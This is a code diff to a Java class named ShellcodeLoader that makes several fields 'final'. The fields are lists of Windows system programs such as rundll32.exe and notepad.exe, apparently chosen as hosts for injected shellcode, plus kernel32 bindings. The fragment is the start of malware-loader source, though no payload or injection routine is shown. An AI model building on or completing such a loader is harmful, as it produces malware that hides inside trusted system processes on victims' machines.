@@ -15,7 +15,7 @@ import com.sun.jna.win32.W32APIOptions;
 import java.util.Random;
 
 public class ShellcodeLoader {
-    public static String[] ProcessArray32 = {"C:\\Windows\\SysWOW64\\ARP.exe", "C:\\Windows\\SysWOW64\\at.exe",
+    public static final String[] ProcessArray32 = {"C:\\Windows\\SysWOW64\\ARP.exe", "C:\\Windows\\SysWOW64\\at.exe",
             "C:\\Windows\\SysWOW64\\auditpol.exe", "C:\\Windows\\SysWOW64\\bitsadmin.exe",
             "C:\\Windows\\SysWOW64\\bootcfg.exe", "C:\\Windows\\SysWOW64\\ByteCodeGenerator.exe",
             "C:\\Windows\\SysWOW64\\cacls.exe", "C:\\Windows\\SysWOW64\\chcp.com",
@@ -24,10 +24,10 @@ public class ShellcodeLoader {
             "C:\\Windows\\SysWOW64\\diskcomp.com", "C:\\Windows\\SysWOW64\\Dism.exe", "C:\\Windows\\SysWOW64\\esentutl.exe",
             "C:\\Windows\\SysWOW64\\expand.exe", "C:\\Windows\\SysWOW64\\fc.exe", "C:\\Windows\\SysWOW64\\find.exe",
             "C:\\Windows\\SysWOW64\\gpresult.exe"};
-    public static String[] ProcessArray64 = {"C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\System32\\find.exe",
+    public static final String[] ProcessArray64 = {"C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\System32\\find.exe",
             "C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\System32\\ARP.EXE"};
-    static Kernel32 kernel32 = Native.load(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
-    static IKernel32 iKernel32 = Native.load("kernel32", IKernel32.class);
+    static final Kernel32 kernel32 = Native.load(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
+    static final IKernel32 iKernel32 = Native.load("kernel32", IKernel32.class);
 
     public static byte[] hexStrToByteArray(String str) {
         if (str == null) {
